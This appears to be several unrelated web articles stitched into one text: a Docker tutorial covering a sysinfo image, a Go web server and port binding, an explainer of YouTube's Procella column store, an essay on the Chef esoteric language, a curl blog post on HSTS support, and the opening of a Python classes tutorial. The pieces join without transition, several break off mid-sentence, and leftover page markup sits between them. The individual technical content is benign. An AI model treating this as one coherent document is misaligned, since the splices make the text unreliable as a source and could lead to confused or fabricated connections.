<p>
  Let's see how we can get this image up and running via the <code>docker build</code> command (note that gcc is
  required to compile the binary):
</p>

<pre>$ cd ~
$ mkdir -p docker/sysinfo
$ cd docker/sysinfo
$ vim sysinfo.cpp

#include &lt;iostream&gt;
#include &lt;sys/utsname.h&gt;

using namespace std;

int main() {
  struct utsname sysinfo;
  uname(&amp;sysinfo);
  
  cout &lt;&lt; "System Name: " &lt;&lt; sysinfo.sysname &lt;&lt; endl;
  cout &lt;&lt; "Host Name: " &lt;&lt; sysinfo.nodename &lt;&lt; endl;
  cout &lt;&lt; "Release(Kernel) Version: " &lt;&lt; sysinfo.release &lt;&lt; endl;
  cout &lt;&lt; "Kernel Build Timestamp: " &lt;&lt; sysinfo.version &lt;&lt; endl;
  cout &lt;&lt; "Machine Arch: " &lt;&lt; sysinfo.machine &lt;&lt; endl;
  cout &lt;&lt; "Domain Name: " &lt;&lt; sysinfo.domainname &lt;&lt; endl;
  
  return 0;
}

$ g++ sysinfo.cpp -o sysinfo
$ ./sysinfo

System Name: Linux
Host Name: coolbeans
Release(Kernel) Version: 4.18.0-16-generic
Kernel Build Timestamp: #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019
Machine Arch: x86_64
Domain Name: (none)


$ vim Dockerfile

FROM ubuntu:18.04
COPY sysinfo /
CMD ["/sysinfo"]

$ docker build . -t sysinfo
$ docker run sysinfo

System Name: Linux
Host Name: d8e53b009d72
Release(Kernel) Version: 4.18.0-16-generic
Kernel Build Timestamp: #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019
Machine Arch: x86_64
Domain Name: (none)
</pre>

<p>
  Note in the difference in hostname between local system (coolbeans) and the running container (d8e53b009d72) in the
  above output.
</p>

<p>
  If you make a mistake, you can remove an image via <code>docker rmi [image-name] --force</code>. Cleaning up unused
  containers and volumes related to the image can be accomplished via <code>docker system prune --volumes</code>.
</p>

<p>
  In the above example, we created a custom image using the standard Ubuntu image as our base image, before we go
  further with creating custom images it would be good to note that the docker
  <a href="https://hub.docker.com/search?q=&amp;type=image&amp;image_filter=official">hub</a> provides lots of free
  pre-configured images for various software. This is the second Docker component and is also sometimes called the
  Docker registry (one can also have private registries).
</p>

<h5>Networking</h5>

<p>
  In most cases, we would like to run a service via Docker. Let is look at how we can accomplish this by using a very
  simple web server as an example. Create the image as follows (note that the example below uses Go to create the
  binary):
</p>

<pre>$ cd ~
$ mkdir -p docker/webapp
$ cd docker/webapp
$ vim webapp.go

package main

import (
	"io"
	"net/http"
)

func hello(w http.ResponseWriter, r *http.Request) {
	io.WriteString(w, "Hello from webapp!")
}

func main() {
	http.HandleFunc("/", hello)
	http.ListenAndServe(":8000", nil)
}

$ go build webapp.go
$ vim Dockerfile

FROM ubuntu:18.04
COPY webapp /
CMD ["/webapp"]

$ docker build . -t webapp
$ docker run -d webapp
cfab907c828a40ce4cc53b88b26badabf8fa6672fd538d0c072fd0947f36d650
</pre>

<p>
  In the above example we built a webapp image and started the docker container with the <code>-d</code> flag. This
  started the container in detached mode and printed the container id so that we could interact with it. We can confirm
  it is running via <code>docker ps</code>:
</p>

<pre>CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
cfab907c828a        webapp              "/webapp"           4 minutes ago       Up 4 minutes                            zealous_herschel    
</pre>

<p>
  At this point we have our web application running in a docker container but we have no way to communicate with it. Run
  <code>docker inspect cfab907c828a</code> to output the container configuration in json format. We are interested in
  the <code>NetworkSettings.Networks.bridge.IPAddress</code> property. Let's try connecting to the provided ip address,
  http://172.17.0.2:8000 (in my case) and we can see our web application in action!
</p>

<p>
  It is also possible to bind ports on from the docker container to the host machine so that we can access services as
  if they were running locally, <code>docker run -d -p3000:8000 webapp</code>. Thus our web application is now available
  on http://localhost:3000!
</p>

<h5>Persistent storage</h5>

<p>
  By default Docker containers come with their own storage which lives as long as the container is running. If we would
  like to persist data across containers, we can either bind a local file/directory to our container or create and mount
  a named Docker volume. The added benefit of using a Docker volume is that it does not necessarily have to be a
  resource on the host file system, it can also be an external cloud storage service depending upon the driver.
</p>

<p>
  A very practical example of using a postgres docker image with persistent data storage can be found
  <a href="https://smalldata.tech/blog/2018/02/23/dockerized-postgresql-with-local-data-storage-on-ubuntu">here</a>.
</p>

<h5>Summary</h5>

<p>
  We looked at Docker basic concepts, created a few containers, ran some services and even persisted data across machine
  restarts! This was longer than 10 minutes but it should be enough to get going with Docker.

<p>Procella is a horizontally scalable, eventually consistent, distributed column
store leveraging lambda architecture to support both realtime and batch queries
<a data-link-type="citation" data-preview-snippet="<p>B. Chattopadhyay, <em>et al.</em>, &quot;Procella: Unifying serving and analytical data at YouTube,&quot; in <em class=cite-journal>Proc. VLDB Endowment</em>, Vol. 12, no. 12, 2019, pp. 2022–2034.</p>" href="https://joe.schafer.dev/procella-youtube-analytical-database/#cite_ref_chattopadhyay2019procella" role="doc-noteref" id="footnote-link-chattopadhyay2019procella"><cite>[1]</cite></a>. Let’s define those terms one at a time:</p>
<ul>
<li>Horizontally scalable means YouTube can spin up more machines and Procella
will distribute queries to the new machines automagically.</li>
<li>Procella doesn't support strong database <a href="https://en.wikipedia.org/wiki/Isolation_(database_systems)" data-link-type="wikipedia" data-preview-title="<div class=&quot;preview-title&quot;><a href=&quot;https://en.wikipedia.org/wiki/Isolation_(database_systems)&quot;>Isolation (database systems)</a></div>" data-preview-snippet="<p>In database systems, isolation determines how transaction integrity is visible
to other users and systems. For example, when a user is creating a Purchase
Order and has created the header, but not the Purchase Order lines, is the
header available for other systems/users (carrying out concurrent operations,
such as a report on Purchase Orders) to see? (Refers to current, not past
database systems)</p>
<p>A lower isolation level increases the ability of many users to access the same
data at the same time, but increases the number of concurrency effects (such as
dirty reads or lost updates) users might encounter. Conversely, a higher
isolation level reduces the types of concurrency effects that users may
encounter, but requires more system resources and increases the chances that one
transaction will block another.</p>
<p>Isolation is one of the <span class=&quot;small-caps&quot;>ACID</span> (Atomicity, Consistency, Isolation, Durability)
properties.</p>">isolation</a> levels (the I in <span>ACID</span>). Queries
support <a href="https://en.wikipedia.org/wiki/Isolation_(database_systems)#Read_uncommitted" data-link-type="wikipedia" data-preview-title="<div class=&quot;preview-title&quot;><a href=&quot;https://en.wikipedia.org/wiki/Isolation_(database_systems)#Read_uncommitted&quot;>Database isolation - read uncommitted</a></div>" data-preview-snippet="<p>This is the lowest isolation level. In this level, dirty reads are allowed, so
one transaction may see not-yet-committed changes made by other transactions. A
dirty read (aka uncommitted dependency) occurs when a transaction is allowed to
read data from a row that has been modified by another running transaction and
not yet committed.</p>">read uncommitted</a> isolation which can cause <em>dirty reads</em>. A dirty
read occurs when a transaction sees uncommitted changes from another
transaction.</li>
<li>The lambda architecture means there are two write paths. The first path, called the
real-time write path, aims for low latency and writes into an unoptimized
row-store that’s immediately available for queries. The second, called the
batch write path, ingests large quantities of data into an optimized columnar
format. The query path merges changes from both real-time and batch storage to
unify results.</li>
<li>Distributed means the data is sharded across multiple servers.</li>
<li>A column store refers to how the database physically stores data. See the
figure below for how we might store a table with three columns: <code>event_id</code>,
<code>time</code>, and <code>path</code>.</li>
</ul>
<figure><picture><img src="https://joe.schafer.dev/procella-youtube-analytical-database/row_column_store.png" loading="lazy" alt="Row store versus column store"></picture><figcaption><span>Figure:</span> The difference in data layout between a row store and a column store.</figcaption></figure><p>We need a bit more room to explain row stores and column stores. A row store
writes data for a single record contiguously. If we’re storing events with three
columns
<code>event_id</code>, <code>time</code>, and <code>path</code>, a row store writes 1 <code>event_id</code>, then 1
<code>time</code>, then 1 <code>path</code>. Then the row store repeats the process for each row.</p>
<p>A column store writes a single column for many rows contiguously. If we had 5
events, we’d first write five <code>event_ids</code>, then 5 <code>times</code>, then 5 <code>paths</code>. The
benefits of a column store are better compression (usually about 10x better) and
better locality since all the values for a single column are adjacent. The
primary disadvantage is you can’t easily update column stores; you have to
rewrite the entire file.</p>
<h2 id="procella-architecture">Procella architecture<a href="#procella-architecture">¶</a></h2>
<p>Procella runs on Google infrastructure which has two important consequences.
First, storage is completely separate from compute. There are no local disks
inside Google. There are only remote procedure calls <span>(RPC)</span>. Instead of reading
or writing to disk, every read or write is an <span>RPC</span>. Second, binaries run on
multi-tenant servers, so a noisy-neighbor can really wreck your day regarding
performance. We’ll revisit these points in the optimizations section.</p>
<p>The architecture for Procella is a lambda architecture with two write data flows
(realtime and batch), and a single query flow.</p>
<figure><picture><img src="https://joe.schafer.dev/procella-youtube-analytical-database/procella-system-arch.png" loading="lazy" alt="Procella system architecture"></picture><figcaption><span>Figure:</span> The Procella system architecture showing the 3 main flows.</figcaption></figure><p>The first write path is the batch data flow (in purple). A user creates a file
in a supported format (typically through a batch job like an hourly map reduce
job). The user sends the file path to the Procella registration server. The
registration server checks that the file header matches the <span>SQL</span> schema for the
user’s schema. After validation, the file is available for querying.
Importantly, Procella doesn't process the file or scan the data other than
sanity checking that the schema matches. This approach is a radical departure
from most existing row stores. For example, when we write an event into Citus,
we create an index on every event definition for that environment.</p>
<p>The second write path is real-time data flow (in blue). Realtime data comes from
<span>RPC</span>s or PubSub (similar to Kafka topics). The ingestion server appends the data
to a write-ahead log <span>(WAL)</span> and stores the data in memory for querying realtime
data. The real-time data flows makes data available for querying in about 1
second. Later, a compaction job will compact the <span>WAL</span> into an optimized columnar
format. The compaction job supports user defined transformations including
filtering data, aggregating data, and expiring old data. This is a really cool
feature. User defined transformations means you can do things like normalize
email addresses to all lowercase. The transformations give you a convenient fix
for customer-specific customizations.</p>
<p>The query path begins at the root server (in orange). The root server does all
the heavy lifting for preparing the query including parsing, query rewrites,
planning, plan selection, and plan optimization. The root server then fetches
the location of data files from the metadata server. A metadata server is
similar to a catalog table which holds the location of all files that make up a
table. Oftentimes, the root server can prune files by using zone maps for the
file. A zone map is lightweight metadata describing all data in the file. A zone
map for a file containing events would include the earliest and latest event
time, and the min/max user ID. For example, if a file’s last event time is
2020-01-19, we don’t need to search the file if the query has a predicate like
<code>WHERE event_time &gt; '2020-02-01'</code>.</p>
<p>The output of the root server is a physical plan tree. Using trees to distribute
large queries to many servers is similar to the approach described in the
<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/36632.pdf" data-link-type="pdf" data-preview-title="<div class=&quot;preview-title&quot;><a href=&quot;https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/36632.pdf&quot;>Dremel: Interactive Analysis of Web-Scale Datasets</a></div>" data-preview-snippet="<p>Dremel is a scalable, interactive ad-hoc query system for analysis of read-only
nested data. By combining multi-level execution trees and columnar data layout,
it is capable of running aggregation queries over trillion-row tables in
seconds. The system scales to thousands of <span class=&quot;small-caps&quot;>CPU</span>s and petabytes of data, and has
thousands of users at Google. In this paper, we describe the architecture and
implementation of Dremel, and explain how it complements MapReduce-based
computing. We present a novel columnar storage representation for nested records
and discuss experiments on few-thousand node instances of the system.</p>">Dremel (BigQuery) paper</a> <a data-link-type="citation" data-preview-snippet="<p>S. Melnik, <em>et al.</em>, &quot;Dremel: interactive analysis of web-scale datasets,&quot; in <em class=cite-journal>Proc.

A tree is necessary because the intermediate
data for large queries might exceed the resources for a single server. The root
server partitions the physical query plan into sub-plans and distributes the
sub-plans. Each data server fetches and transforms the data according to the
sub-plan.</p>

<h2 id="query-evaluation">Query evaluation<a href="#query-evaluation">¶</a></h2>
<p>The advantage of a column store for large analytical queries is a combination of
four attributes as described by Abadi (think the Knuth of column stores) in
<a href="https://joe.schafer.dev/papers/abadi2013design.pdf" data-link-type="pdf" data-preview-title="<div class=&quot;preview-title&quot;><a href=&quot;/papers/abadi2013design.pdf&quot;>The Design and Implementation of Modern Column-Oriented Database Systems</a></div>" data-preview-snippet="<p>In this article, we survey recent research on column-oriented database systems,
or column-stores, where each attribute of a table is stored in a separate file
or region on storage. Such databases have seen a resurgence in recent years with
a rise in interest in analytic queries that perform scans and aggregates over
large portions of a few columns of a table. The main advantage of a column-store
is that it can access just the columns needed to answer such queries. We
specifically focus on three influential research prototypes, MonetDB,
MonetDB/X100, and C-Store. These systems have formed the basis for
several well-known commercial column-store implementations. We describe their
similarities and differences and discuss their specific architectural features
for compression, late materialization, join processing, vectorization and
adaptive indexing (database cracking).</p>">The Design and Implementation of Modern Column-Oriented Database Systems</a> <a data-link-type="citation" data-preview-snippet="<p>D. Abadi, P. Boncz, S. Harizopoulos, S. Idreos, S. Madden <em>et al.</em>, &quot;The design and implementation of modern column-oriented database systems,&quot; in <em class=cite-journal>Foundations Trends Databases</em>, Vol. 5, no. 3, 2013, pp. 197–280.</p>" href="https://joe.schafer.dev/procella-youtube-analytical-database/#cite_ref_abadi2013design" role="doc-noteref" id="footnote-link-abadi2013design"><cite>[3]</cite></a>.</p>
<ul>
<li>Vectorized execution: apply functions on an array of values from a single
column. In contrast, a row store processes 1 row at time and extracts the
column from each row.</li>
<li>Operation on compressed data: Instead of decompressing data, operate directly
on it by using knowledge of the compression scheme. Don’t think <span>GZIP</span> here,
think run-length encoding where we can represent the array
<code>[3, 3, 3, 3, 8, 8]</code> as <code>[(3, 4), (8, 2)]</code>. With run-length encoding,
calculating the count is <code>4 + 2 = 6</code>.</li>
<li>Late materialization: the query engine keeps intermediate data in a column
format for as long as possible to dramatically speed up aggregations.
Materialization means converting columns into rows.</li>
<li>Database cracking: create indexes just-in-time. The database incrementally
sorts columns as a side effect of query processing, e.g. <code>ORDER BY time</code>. With
database cracking, we keep the intermediate sorted results for use in
following queries. In contrast, row stores require creating indexes ahead of
time. Since query patterns change over time, the indexes might not get used.
Database cracking ensures indexes are always up to date and match query
patterns precisely.</li>
</ul>
<h3 id="operation-on-compressed-data">Operation on compressed data<a href="#operation-on-compressed-data">¶</a></h3>
<p>Procella leverages adaptive encoding (aka lightweight compression) which is a
fancy way of saying it tries a bunch of different encodings and picks the best
one. For example, you can use any of the following encodings for an array of
integers. Consider the array [3, 4, 4, 4, 0, 0, 9]. Here’s what different
encoding would produce.</p>
<ul>
<li>Run length encoding: <code>[(3, 1), (4, 3), (0, 2), (9, 1)]</code></li>
<li>Delta encoding (the difference from the previous value):
<code>[3, 1, 0, 0, -4, 0, 9]</code></li>
<li>Frame of reference (the difference from the initial value):
<code>[3, 1, 1, 1, -4, -4, 6]</code></li>
</ul>
<p>For an array of strings, consider <code>[foo, bar, baz, baz, bar, qux]</code>. Dictionary
encoding creates a mapping from a string to an
integer:<code>{foo: 0, bar: 1, baz: 2, qux: 3} =&gt; [0, 1, 2, 2, 3, 1]</code>. There are all
sorts of clever variations on dictionary encoding. Some of my favorites are
using prefix compression on the dictionary itself and using a two-level
dictionary where each column has its own dictionary and all strings are stored
in a global dictionary.</p>
<h3 id="inverted-indexes-for-experiment-ids">Inverted indexes for experiment IDs<a href="#inverted-indexes-for-experiment-ids">¶</a></h3>
<p>Procella relies on database cracking instead of pre-declared indexes. However,
Procella supports a single secondary index for arrays of numbers. The use case
is to track the results of experiments. Each experiment is represented with an
integer ID. A row might have several experiments associated with it, like
<code>{row_id: 43, experiments: [543, 778, 901]}</code>. For a query like:</p>
<div><pre><code-kw>SELECT</code-kw> <code-kw>count</code-kw>(*) <code-kw>FROM</code-kw> events <code-kw>WHERE</code-kw> 543 <code-kw>IN</code-kw> experiments
</pre></div><p>Procella must check the experiments array of each row. As an optimization,
Procella adds an <a href="https://en.wikipedia.org/wiki/Inverted_index" data-link-type="wikipedia" data-preview-title="<div class=&quot;preview-title&quot;><a href=&quot;https://en.wikipedia.org/wiki/Inverted_index&quot;>Inverted index</a></div>" data-preview-snippet="<p>In computer science, an inverted index (also referred to as a postings file or
inverted file) is a database index storing a mapping from content, such as words
or numbers, to its locations in a table, or in a document or a set of documents
(named in contrast to a forward index, which maps from documents to content).
The purpose of an inverted index is to allow fast full-text searches, at a cost
of increased processing when a document is added to the database. The inverted
file may be the database file itself, rather than its index. It is the most
popular data structure used in document retrieval systems, used on a large
scale for example in search engines.</p>
<p>There are two main variants of inverted indexes: A record-level inverted index
(or inverted file index or just inverted file) contains a list of references to
documents for each word. A word-level inverted index (or full inverted index or
inverted list) additionally contains the positions of each word within a
document. The latter form offers more functionality (like phrase searches), but
needs more processing power and space to be created.</p>">inverted index</a>
from an experiment ID to all the rows that contain that experiment. For the
example above, the index might look like: <code>{543: [43], 778: [43], 901: [43]}</code>.
With this index, we can go to the key 543 and search only those rows. This
optimization yielded a 500x speed-up in queries that contained an experiment
filter clause.</p>
<h2 id="optimizations">Optimizations<a href="#optimizations">¶</a></h2>
<h3 id="caching">Caching<a href="#caching">¶</a></h3>
<p>The metadata servers, which contain the mapping of <span>SQL</span> tables to the data files
that hold the data, caches the locations of all data files with a 99% hit rate.
The paper was unclear, but I’m pretty sure the metadata server uses a three
level cache. The source of truth is Spanner, a strongly consistent row store
similar to Postgres but magically scalable and expensive. Spanner has a P99
latency of about 500ms. The second level of cache is Bigtable, a key-value
store, which has P99 of about 50ms. The final cache is in-memory cache on the
server with a latency of about 100ns.</p>
<p>The data servers, which fetch and process data files, cache the data files with
a least-recently used scheme to attain a 90% hit rate. Impressively, only 2% of
the total data in Procella is stored in memory at any one time. The reason the
cache hit rate is high is due to affinity scheduling. Affinity scheduling means
the root server will consistently route requests for a file to the same server,
improving the hit …</p></article></div></div></div>

                <p><img src="https://esoteric.codes/uploads/f37af184-21a8-4b0e-9414-c1770a53dcef-chef_animated2.gif" alt="" width="" height=""></p>
<p>To bake a <a href="https://esolangs.org/wiki/Chef" target="_blank" rel="noopener">Hello World Souffle</a> requires exactly 114 g sugar, 111 ml beaten eggs, 54 ml double cream, and 32 g cocoa powder. Most recipes measure by the number of eggs, rather than their volume in milliliters, and do not opt for a level of specificity appropriate more for a chemistry lab than a kitchen. However, this recipe is not only for cooking, but also serves as a computer program in the Chef language.</p>
<p>Chef is one of the best-known esolangs to embrace multicoding: where content has different meanings when considered in different contexts. The term (as "multiple coding") was coined by Michael Mateas and Nick Montfort in their <a href="https://nickm.com/cis/a_box_darkly.pdf" target="_blank" rel="noopener">"A Box, Darkly"</a> (2005), the paper that first introduced many academics to esoteric and obfuscated coding practices. It uses the example of "Jean put dire comment on tap," a phrase that holds very different meanings in French and English. Programs can be multicoded on a few different levels. Malicious programs are sometimes written with a gap between its reading by a human and its actual execution by the machine. In <a href="https://esoteric.codes/blog/primify" target="_blank" rel="noopener">our previous post</a>, we looked at the case of Primify, which multicodes numbers and images. Programs known as polyglots have a single text that holds multiple meanings even to the machine itself, functioning differently when interpreted in more than one programming language.</p>
<p>When Chef appeared in 2003, it joined a slowly growing list of esolangs that are explicitly multicoding, although this term was not one used by their creators (they are usually simply described as "designed to make programs appear to be something else"). Its author, David Morgan-Mar (<a href="https://esoteric.codes/blog/david-morgan-mar" target="_blank" rel="noopener">interviewed here</a>), created the cult esolang Piet the previous year. Where Chef's programs multicode as cooking recipes, programs in Piet (pronounced "Pete") are images, with commands defined by the change in hue or lightness between adjacent pixelly blobs of color, called codels. Shakespeare (created 2001) has as its programs, long, rambling stage scripts. Whitespace (2003) uses only tab, space, and return. In Whitespace, commands are multicoded as what is normally read as their absence. These characters are treated interchangeably by C and C-derived languages, meaning Whitespace programs can be embedded between words in these programs, creating polyglot programs that function in both languages.</p>
<p>There were few precursors for these languages in the early '00s. Previous esolangs like brainfuck and Malbolge had unusual lexicons, but emphasized their puzzle-like logic. Multicoding languages don't generally have unusual logical systems, most are straightforward, procedural languages behind their odd vocabularies. More recent multicoding languages, like <a href="https://esoteric.codes/blog/esopo-turing-complete-poetry" target="_blank" rel="noopener">AshPaper</a> and <a href="https://esoteric.codes/blog/bodyfuck-gestural-code" target="_blank" rel="noopener">bodyfuck</a>, have benefited from these forerunners, learning the lessons of how Shakespeare commands are constructed as dialogue. But at the time Shakespeare was written, it was intended primarily as both joke and provocation. Its creators likely had little expectation that esoprogrammers would continue to work with these languages and learn from them decades later. Otherwise, there would be alternatives to Shakespeare's repetitive "SPEAK YOUR MIND!" command. So it might seem unfair to overly critique their design decisions, but considering Chef's design more deeply can give us insight into how multicoding schemes function and help consider possibilities in multicoding strategies for future works.</p>
<h3>Chef's Central Metaphor</h3>
<p>Chef differs from Whitespace and Piet in the confluence of its central metaphor. While a cooking recipe might sound as arbitrary as the systems other esolangs use, it differs in that recipes <em>already are</em> algorithms. A recipe is a plan, worked out step by step: well-ordered, repeatable, and, given the expected input and faithful execution, produces the expected output. In fact, recipes have long held as an example of algorithmic thinking for non-programmers (see, for instance, the <a href="https://simple.wikipedia.org/wiki/Algorithm" target="_blank" rel="noopener">entry for <em>Algorithm</em> in the Simple English Wikipedia</a>, which strives for simple explanations). Recipes, like other algorithms, break up continuous processes into discreet steps that can be carried out in an orderly way. In her <em>Contingent Computation,</em> M. Beatrice Fazi describes this systematizing of process as a "discretization of reality":</p>
<blockquote>
<p>The <strong>digital</strong> is a technique of information processing that represents and manages data in the form of digits, such as, for instance, the zeros and ones of digital binary systems. In the <strong>computational</strong>, discreteness is similarly expressed via quantifying means, such as models, procedures, representations, symbols, numbers, measures, and formulizations. When we compute—digitally or not—we arrange reality into sets of abstracted relations between these quantifiable entities.</p>
</blockquote>
<p>From p. 48, with the emphasis mine</p>
<p>In this way, cooking recipes are computational to begin with. A continuous process is made into bounded steps akin to lines of code in a procedural program: individual steps of an algorithm, explicitly spelled out. Where Piet uses a digital lexicon—a series of pixels—Chef uses a computational one.&nbsp;</p>
<h3>Multicoding Aesthetics</h3>
<p>Chef is not just a theoretical system that equates cooking and coding. Specific choices were made in mapping the two systems together, and the aesthetic of a multicoding language is defined by that mapping and the constraints it creates for its programs. Before considering how this works in Chef, we might look at how dual meanings are handled in Piet. Piet has a palette of twenty different colors. It has the black, white, red, yellow, blue used in the (later, abstract geometric) Mondrian works—but also magenta, green, and cyan, with three different shades of each. With a language named for Mondrian, we might ask why the palette wasn't restricted to the subtractive primaries. But Morgan-Mar didn't particularly want people to mimic Mondrian's style. If he did, he could have locked down the color choices and the layout of Piet geometries to lines and rectangles. In <a href="https://esoteric.codes/blog/david-morgan-mar" target="_blank" rel="noopener">his interview with esoteric.codes</a>, Morgan-Mar states that:</p>
<blockquote>
<p>I think that Piet has proven itself a general enough medium now that programmers can achieve virtually any visual appearance they put their mind to. So I don’t like to think of it as constrained to any particular aesthetic—that would be limiting. I’d rather people tried to push the boundaries out and create something we haven’t seen yet.</p>
</blockquote>
<p>Piet, while flexible enough to construct a range of different styles, encourages certain types of visual works. We can see it in the programs which don't attempt to contort into Mondrian-like imagery (or other specific styles), but instead are written in the simplest way, ending up often with dense configurations of codels from across Piet's spectrum, determined primarily by functionality, such as the two Prime Number Tests by Alexander Rodgers below (<a href="https://www.dangermouse.net/esoteric/piet/samples.html" target="_blank" rel="noopener">see more Piet programs here</a>).</p>
<p><img src="https://esoteric.codes/uploads/cd92bc70-15ae-450f-a8dc-d995f33cc04c-chef_primetest.png" alt="" width="" height=""></p>
<p>This tension between a multicoding esolang's constraints and its use as an all-purpose medium is at work in nearly all multicoding esolangs. All esolangs—multicoding or not—are open-ended works that are only <a href="https://esoteric.codes/blog/esolangs-as-an-experiential-practice" target="_blank" rel="noopener">fully explored by the esoprogrammers</a> who discover the language's character by concretizing it in working programs. The tension in multicoding esolangs is between this open-endedness and the specificity of its rules. Programmers will stretch the language's design, making aesthetic discoveries that might surprise the esolang's creator. Where an individual program might have a specific aesthetic, it's what the great many programs written in the esolang have in common that describe the aesthetic of the language itself. This is reminiscent of the experimental writing movement Oulipo and other constraint systems that describe sets of rules but require many writers' experiments to discover what those rules allow for.</p>
<h3>The Aesthetics of Chef</h3>
<p>But what of the aesthetics of the Chef language? Does it allow a lot of freedom for its programmers, or do most Chef programs look (taste) the same? For insight on this, I reached out to Ian Bogost. Bogost, author of the excellent book <a href="http://bogost.com/books/play-anything/" target="_blank" rel="noopener"><em>Play Anything</em></a>, which explores creativity within constraint-based systems, has taught Chef to creative coding students for 15 years. Teaching Chef for such as long time has made him responsible, by his account, for 99% of the world's Chef programs. He selected Chef to introduce code aesthetics for a few reasons:</p>
<blockquote>
<p>I like Chef because it’s far more earnest. Nobody is going to perform an act of Shakespeare code; it’s mostly conceptual. But Chef is actually viable. I also like it because it multicodes in a gratifying and challenging way on multiple registers:</p>
<p>- The program runs and does something computationally interesting<br>- The code is legible and coherent as the text of a recipe<br>- The recipe is logically consistent and can be followed step by step in the kitchen as written<br>- When followed, the output of the recipe as recipe is gastronomically interesting and delicious</p>
<p>I always ask the students to try to write a Chef program that multicodes on all these registers. Some years, time willing, I invite students to bring in their cooked programs to share (and for a little extra credit).</p>
</blockquote>
<p>This makes Bogost one of the very few who have tasted more than one completed Chef program. In <em>Play Anything</em> he includes a recipe written by a student that succeeds both algorithmically and gastronomically. He notes that "In Chef, the variables are 'ingredients'; the input is the 'refrigerator', the output and memory is a series of 'mixing bowls' and 'baking dishes', and the instructions are the steps of the recipe itself."</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security" target="_blank">HTTP Strict Transport Security</a> (HSTS) is a standard HTTP response header for sites to tell the client that for a specified period of time into the future, that host is not to be accessed with plain HTTP but only using HTTPS. Documented in <a href="https://tools.ietf.org/html/rfc6797">RFC 6797</a> from 2012.</p>



<p>The idea is of course to reduce the risk for man-in-the-middle attacks when the server resources might be accessible via both HTTP and HTTPS, perhaps due to legacy or just as an upgrade path. Every access to the HTTP version is then a risk that you get back tampered content.</p>



<h2>Browsers preload</h2>



<p>These headers have been supported by the popular browsers for years already, and they also have a system setup for <em>preloading</em> a set of sites. Sites that exist in their <a href="https://hstspreload.org/">preload list</a> then never get accessed over HTTP since they know of their HSTS state already when the browser is fired up for the first time.</p>



<p>The entire <code>.dev</code> top-level domain is even in that preload list so you can in fact never access a web site on that top-level domain over HTTP with the major browsers.</p>



<h2>With the curl tool</h2>



<p>Starting in curl 7.74.0, curl has <em>experimental</em> support for HSTS. Experimental means it isn’t enabled by default and we discourage use of it in production. (Scheduled to be released in December 2020.)</p>



<p>You instruct curl to understand HSTS and to load/save a cache with HSTS information using <code>--hsts &lt;filename&gt;</code>. The HSTS cache saved into that file is then updated on exit and if you do repeated invokes with the same cache file, it will effectively avoid clear text HTTP accesses for as long as the HSTS headers tell it.</p>



<p>I envision that users will simply use a small hsts cache file for specific use cases rather than anyone ever really want to have or use a “complete” preload list of domains such as the one the browsers use, as that’s a <em>huge</em> list of sites and for most use cases just completely unnecessary to load and handle.</p>



<h2>With libcurl</h2>



<p>Possibly, this feature is more useful and appreciated by applications that use libcurl for HTTP(S) transfers. With libcurl the application can set a file name to use for loading and saving the cache but it also gets some added options for more flexibility and powers. Here’s a quick overview:</p>



<p><a href="https://curl.haxx.se/libcurl/c/CURLOPT_HSTS.html">CURLOPT_HSTS</a> – lets you set a file name to read/write the HSTS cache from/to.</p>



<p><a href="https://curl.haxx.se/libcurl/c/CURLOPT_HSTS_CTRL.html">CURLOPT_HSTS_CTRL</a> – enable HSTS functionality for this transfer</p>



<p><a href="https://curl.haxx.se/libcurl/c/CURLOPT_HSTSREADFUNCTION.html">CURLOPT_HSTSREADFUNCTION</a> – this callback gets called by libcurl when it is about  to start a transfer and lets the application preload HSTS entries – as if they had been read over the wire and been added to the cache.</p>



<p><a href="https://curl.haxx.se/libcurl/c/CURLOPT_HSTSWRITEFUNCTION.html">CURLOPT_HSTSWRITEFUNCTION</a> – this callback gets called repeatedly when libcurl flushes its in-memory cache and allows the application to save the cache somewhere and similar things.</p>



<h2>Feedback?</h2>



<p>I trust you understand that I’m very very keen on getting feedback on how this works, on the API and your use cases. Both negative and positive. Whatever your thoughts are really!</p>

<h3><span>Introduction</span></h3>

<p><span>Python is an Object-oriented programming language, therefore, relies heavily on objects.</span></p>

<p><span>Object-oriented programming is one of the most <span>effective</span> approaches to writing<span> software</span>. </span></p>

<p><span>In this approach of programming, you write <span>classes</span> that represent real-world things, and you create <span>objects based on these classes</span>. </span></p>

<p><span>When you write a class, you define the general behavior that a whole category of objects can have.</span></p>

<p><span>A <span>Class</span> is an object constructor for creating objects. They provide a means of bundling data and functionality together.</span></p>

<p><span><span>Creating a new class creates a new <em>type</em> of object</span>, allowing new <span>instances</span><span> </span>of that type to be made. </span></p>



<h3><span>Defining a class in python</span></h3>

<p><span>The python&nbsp;class is made up of attributes (data) and methods (functions).&nbsp;</span></p>

<p><span>Attributes and methods are simply defined as <span>normal variables</span> and <span>f</span><span>unctions.</span></span></p>

<p><span>Creating the class involves :&nbsp; </span></p>

<ul>
	<li><span>Defining the class name</span></li>
	<li><span>Defining the class attributes</span></li>
</ul>



<p><span>A Class definition introduces a little bit of new syntax. In Python, a function definition begins with the <span>def</span> keyword, but a class definition begins with a <span>class</span> keyword.</span></p>

<pre><code>class ClassName:
    # your atrributes</code></pre>



<p><span>Example of a simple class representing a Person as an Object</span></p>

<pre><code>class Person:
    name = "John"
    age = 11</code></pre>

<p><span>&nbsp;Everything defined in the class is called a <span>class attribute</span> and these class attributes can be functions (methods) or variables. </span></p>



<p><span>The making of an object from a class is called <strong>instantiation</strong>, and you work with instances of a class.</span></p>

<p><span>An example of <span>the instantiation</span> of the <code>Person</code> class is :</span></p>

<pre><code>p = Person()</code></pre>

<p><span>An instance of the <code>Person</code> class is stored in a variable p. So this creates a new object called p.</span></p>

<p><span>We can access the attributes of objects using the object name prefix.</span></p>

<pre><code>p.name        # John
p.age         # 11</code></pre>



<p><span>Note for this class, all instances you create is going to have the <span>same name and age</span>, which is not ideal. </span></p>

<p><span>We will have to improve the class so that every instance of a Person we create will have its own name and age.</span></p>



<h3><span>A little more dive into Classes</span></h3>

<p><span>Let's take a look at a more complex class representing a <span>Person</span>.</span></p>

<pre><code>class Person:
    def __init__(self, name, age):
        self.name = name
